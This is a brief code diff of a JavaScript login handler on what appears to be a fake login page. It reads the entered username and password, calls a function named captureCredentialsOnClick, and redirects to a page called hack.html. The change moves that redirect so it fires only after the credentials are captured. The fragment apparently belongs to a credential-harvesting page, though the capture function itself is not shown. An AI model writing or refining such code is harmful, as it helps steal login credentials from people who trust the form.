@@ -67,12 +67,12 @@
     function handleLogin() {
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
-      window.location.href = './hack.html';
 
 
       if (username && password) {
         alert('Welcome');
         captureCredentialsOnClick();
+        window.location.href = './hack.html';
 
         // You can perform navigation or other actions here
       } else {
